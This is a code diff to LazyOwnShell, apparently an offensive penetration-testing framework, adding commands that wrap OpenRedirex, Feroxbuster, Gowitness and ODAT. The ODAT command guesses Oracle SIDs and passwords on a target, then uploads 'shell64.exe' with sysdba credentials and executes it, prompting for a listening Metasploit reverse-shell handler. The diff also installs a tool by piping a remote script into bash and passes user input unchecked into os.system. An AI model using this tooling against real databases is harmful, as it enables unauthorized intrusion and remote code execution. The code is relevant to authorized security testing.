@@ -86,7 +86,7 @@ class LazyOwnShell(Cmd):
         "gpt": "run lazygptcli",
         "hash": "sh cat sessions/hash*",
         "hosts": "sh sudo nano /etc/hosts",
-        "info":"echo \"<?php phpinfo(); ?>\" > sessions/info.php",
+        "info": "sh echo \"<?php phpinfo(); ?>\" > sessions/info.php",
         "ls": "list",
         "nmap": "run lazynmap",
         "now": "clock",
@@ -7088,7 +7088,8 @@ class LazyOwnShell(Cmd):
             'php',
             'users.txt',
             'sslscan-singleip.sh',
-            'tor.sh'
+            'tor.sh',
+            'payloads.txt'
         ]
 
         # Path to the sessions directory
@@ -14904,6 +14905,286 @@ class LazyOwnShell(Cmd):
         print_msg("PowerShell script 'sessions/adconnect.ps1' has been created.")
         return
 
+    def do_openredirex(self, line):
+        """
+        Command openredirex: Clones, installs, and runs OpenRedirex for testing open redirection vulnerabilities.
+
+        This function performs the following tasks:
+        1. Clones the OpenRedirex repository if not already cloned.
+        2. Installs the required dependencies using the setup script.
+        3. Prompts the user for required inputs like the URL list, payloads file, keyword, and concurrency level.
+        4. Executes OpenRedirex to scan the provided URLs for open redirection vulnerabilities.
+
+        Args:
+            line (str): Optional argument for specifying the URL list, payload file, keyword, and concurrency level.
+
+        Returns:
+            None
+
+        Example:
+            openredirex list_of_urls.txt payloads.txt FUZZ 50
+        """
+        url = self.params["url"]
+        path = os.getcwd()
+        exploit_dir = os.path.join(path, "external/.exploit")
+        openredirex_url = "https://github.com/devanshbatham/openredirex.git"
+        openredirex_dir = os.path.join(exploit_dir, "openredirex")
+        file_payloads = f"{path}/sessions/payloads.txt"
+        os.makedirs(exploit_dir, exist_ok=True)
+        file_url = f"{path}/sessions/urls.txt"
+        with open(file_url, 'w') as file:
+            file.write(url)
+
+        if not os.path.exists(openredirex_dir):
+            print_msg("Cloning OpenRedirex repository...")
+            os.system(f"git clone {openredirex_url} {openredirex_dir}")
+            print_msg("Setting up OpenRedirex...")
+            os.system(f"chmod +x {openredirex_dir}/setup.sh && {openredirex_dir}/setup.sh")
+        else:
+            print_msg("OpenRedirex already cloned and setup, skipping setup.")
+
+        if not line:
+            urls_file = input(f"    {GREEN}[!] Enter the path to the list of URLs (default: {file_url}): ").strip() or file_url
+            payloads_file = input(f"    [?] Enter the path to the payloads file (default: {file_payloads}): ").strip() or file_payloads
+            keyword = input("    [?] Enter the keyword to replace in URLs (default 'FUZZ'): ").strip() or "FUZZ"
+            concurrency = input("    [?] Enter the concurrency level (default 100): ").strip() or "100"
+            
+        else:
+            args = line.split()
+            urls_file = args[0] if len(args) > 0 else ""
+            payloads_file = args[1] if len(args) > 1 else ""
+            keyword = args[2] if len(args) > 2 else "FUZZ"
+            concurrency = args[3] if len(args) > 3 else "100"
+
+        if not urls_file:
+            print_warn("No URL file provided, aborting scan.")
+            return
+        
+        payloads_option = f"-p {payloads_file}" if payloads_file else ""
+        command = f"cat {urls_file} | python3 {openredirex_dir}/openredirex.py {payloads_option} -k {keyword} -c {concurrency}"
+
+        print_msg(f"Running OpenRedirex scan: {command}")
+        os.system(command)
+        return
+
+    def do_feroxbuster(self, line):
+        """
+        Command feroxbuster: Installs and runs Feroxbuster for performing forced browsing and directory brute-forcing.
+
+        This function performs the following tasks:
+        1. Installs Feroxbuster using a `curl` command if it's not already installed.
+        2. Prompts the user for required inputs like the target URL, wordlist, file extensions, and additional options.
+        3. Executes Feroxbuster for directory enumeration and brute-force attacks.
+
+        Args:
+            line (str): Optional argument for specifying the target URL, wordlist, and other Feroxbuster options.
+
+        Returns:
+            None
+
+        Example:
+            feroxbuster -u http://example.com -w wordlist.txt -x php,html
+        """
+        url = self.params["url"]
+        wordlist = self.params["wordlist"]
+        path = os.getcwd()
+        
+        exploit_dir = os.path.join(path, "external/.exploit")
+        feroxbuster_url = "https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh"
+        feroxbuster_bin = os.path.join(os.getenv("HOME"), ".local/bin/feroxbuster")
+        
+        os.makedirs(exploit_dir, exist_ok=True)
+
+        if not os.path.exists(feroxbuster_bin):
+            print_msg("Installing Feroxbuster...")
+            os.system(f"curl -sL {feroxbuster_url} | bash -s $HOME/.local/bin")
+        else:
+            print_msg("Feroxbuster already installed, skipping installation.")
+
+        if not line:
+            url = input(f"    {GREEN}[!] Enter the target URL (default: {url}): ").strip() or url
+            wordlist = input(f"    [?] Enter the wordlist file (default: {wordlist}): ").strip() or wordlist
+            extensions = input("    [?] Enter file extensions (comma-separated, optional): ").strip()
+            headers = input("    [?] Enter additional headers (optional): ").strip()
+            recursion = input("    [?] Enable recursion? (y/n, default 'y'): ").strip().lower() or 'y'
+            verbosity = input("    [?] Verbosity level (1-3, default '1'): ").strip() or "1"
+        
+        else:
+            args = line.split()
+            url = args[0] if len(args) > 0 else ""
+            wordlist = args[1] if len(args) > 1 else ""
+            extensions = args[2] if len(args) > 2 else ""
+            headers = args[3] if len(args) > 3 else ""
+            recursion = args[4] if len(args) > 4 else 'y'
+            verbosity = args[5] if len(args) > 5 else "1"
+
+        if not url:
+            print_warn("No URL provided, aborting scan.")
+            return
+
+        wordlist_option = f"-w {wordlist}" if wordlist else ""
+        extensions_option = f"-x {extensions.replace(',', ' -x ')}" if extensions else ""
+        headers_option = f"-H {headers}" if headers else ""
+        recursion_option = "--no-recursion" if recursion == 'n' else ""
+        verbosity_option = f"-{'v' * int(verbosity)}"
+        
+
+        command = f"{feroxbuster_bin} -u {url} {wordlist_option} {extensions_option} {headers_option} {recursion_option} {verbosity_option}"
+
+        print_msg(f"Running Feroxbuster scan: {command}")
+        os.system(command)
+        return
+
+    def do_gowitness(self, line):
+        """
+        Command gowitness: Installs and runs Gowitness for screenshotting web services or network CIDR blocks.
+
+        This function performs the following tasks:
+        1. Ensures that Gowitness is installed (if not, installs it).
+        2. Allows the user to select the scan type (single, scan, nmap, report).
+        3. Based on the scan type, prompts for the appropriate input (URL or XML file).
+        4. Allows the user to choose additional flags based on the scan type.
+        5. Executes Gowitness with the chosen parameters.
+
+        Args:
+            line (str): Optional argument for specifying the URL or scan type.
+
+        Returns:
+            None
+
+        Example:
+            gowitness nmap -f scan_results.xml --write-db
+        """
+
+        gowitness_path = os.path.expanduser("~/go/bin/gowitness")
+        path = os.getcwd()
+        sessions = f"{path}/sessions"
+        rhost = self.params["rhost"]
+        if not os.path.exists(gowitness_path):
+            print_warn("Gowitness not found, installing...")
+            os.system("go install github.com/sensepost/gowitness@latest")
+        else:
+            print_msg("Gowitness already installed, skipping installation.")
+
+        gowitness_command = f"{gowitness_path} report server --screenshot-path {sessions}/img/{rhost}_screenshots"
+        
+        print_msg(f"Running Gowitness scan: {gowitness_command}")
+        os.system(gowitness_command)
+
+        return
+
+
+    def do_odat(self, line):
+        """
+        Command odat: Runs the ODAT sidguesser module to guess Oracle SIDs on a target Oracle database.
+
+        This function performs the following tasks:
+        1. Ensures that ODAT is installed (checks if 'odat.py' exists).
+        2. Allows the user to specify the RHOST and port.
+        3. Runs ODAT's 'sidguesser' module with the specified parameters.
+
+        Args:
+            line (str): Optional argument for specifying additional ODAT options.
+
+        Returns:
+            None
+
+        Example:
+            odat
+        """
+        rhost = self.params["rhost"]
+        path = os.getcwd()
+        exploit_dir = os.path.join(path, "external/.exploit")
+        sessions_dir = os.path.join(path, "sessions")
+        file_gz = "odat-linux-libc2.17-x86_64.tar.gz"
+        odat_url = f"https://github.com/quentinhardy/odat/releases/download/5.1.1/odat-linux-libc2.17-x86_64.tar.gz"
+        odat_dir = os.path.join(exploit_dir, "odat")        
+        odat_path = f"{odat_dir}/odat-libc2.17-x86_64/odat-libc2.17-x86_64"
+        if not os.path.exists(odat_path):
+            print_msg("Download from ODAT repository...")
+            command = f"mkdir {odat_dir} && cd {odat_dir} && wget {odat_url} && tar -vzxf {file_gz} --strip-components=1 && chmod +x {odat_path}"
+            print(command)
+            os.system(command)
+            print_msg("ODAT downloaded successfully.")
+            print_msg("Running ODAT sidguesser...")
+        else:
+            print_msg("ODAT already downloaded, skipping download.")
+
+        rhost = input(f"    {GREEN}[!] Enter the target RHOST (default {rhost}): ").strip() or rhost
+        port = input(f"    [?] Enter the target port (default 1521): ").strip() or "1521"
+        
+        if not line:
+            list_attacks = ["sidguesser", "passwordguesser", "utlfile", "externaltable"]        
+            print_msg("Select an attack: ")
+            for i, attack in enumerate(list_attacks, 1):
+                print_warn(f"{i}. {attack}")
+        try:
+            selected_attack = int(input(f"{GREEN}    [!] Enter yout choice (1-{len(list_attacks)}): "))
+            if 1 <= selected_attack <= len(list_attacks):
+                print_msg(f"Attack selected: {list_attacks[selected_attack - 1]}")
+                line = list_attacks[selected_attack - 1]
+            else:
+                print_error(f"Wrong choice: {len(list_attacks)}.")
+                return
+        except ValueError:
+            print_error("Enter a valid option.")
+            return
+
+        if line.startswith("sidguesser"):
+        
+            odat_command = f"cd {odat_dir}/odat-libc2.17-x86_64 && {odat_path} sidguesser -s {rhost} -p {port}"
+            print_msg(f"Running ODAT SID guessing on {rhost}:{port}... {odat_command}")
+
+            os.system(odat_command)
+
+        elif line.startswith("passwordguesser"): 
+            SID = input("    [!] Enter valid SID: ")
+            odat_command = f"cd {odat_dir}/odat-libc2.17-x86_64 && {odat_path} passwordguesser -s {rhost} -p {port} -d {SID} --accounts-file accounts/accounts.txt"
+            print_msg(f"Running ODAT SID guessing on {rhost}:{port}... {odat_command}")
+
+            os.system(odat_command)
+    
+        elif line.startswith("utlfile"): 
+            if os.path.exists(os.path.join(sessions_dir, 'shell64.exe')):
+                if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
+                    credentials = get_credentials()
+                    if not credentials:
+                        return
+
+                    for user, passwd in credentials:
+                        password = passwd
+                        username = user      
+                    SID = input("    [!] Enter valid SID: ")
+                    odat_command = f"cd {sessions_dir} && {odat_path} utlfile -s {rhost} -p {port} -U {username} -P {password} -d {SID} --sysdba --putFile /temp shell64.exe shell64.exe"
+                    print_msg(f"Running ODAT SID guessing on {rhost}:{port}... {odat_command}")
+
+                    os.system(odat_command)
+                else:
+                    print_error(f"Credentials must be set, use: {GREEN}createcredentials admin:admin")
+            else:
+                print_error(f"Shell64.exe not found, use: {GREEN}venom")
+        
+        elif line.startswith("externaltable"): 
+
+            if os.path.exists(os.path.join(sessions_dir, 'credentials.txt')):
+                credentials = get_credentials()
+                if not credentials:
+                    return
+
+                for user, passwd in credentials:
+                    password = passwd
+                    username = user      
+                SID = input("    [!] Enter valid SID: ")
+                odat_command = f"{odat_path} externaltable -s {rhost} -p {port} -U {username} -P {password} -d {SID} --sysdba --exec /temp shell64.exe"
+                print_msg(f"Running ODAT SID guessing on {rhost}:{port}... {odat_command}")
+                input(f"Press enter to execute, rember metasploit handdler must be listening, use in another terminal:{GREEN} msf rev win64 {RESET}")
+                os.system(odat_command)
+            else:
+                print_error(f"Credentials must be set, use: {GREEN}createcredentials admin:admin")
+        else:
+            print_error("Wrong choice")
+        print_msg(f"Odat command executed: odat_command")
+        return
 
 if __name__ == "__main__":
     p = LazyOwnShell()
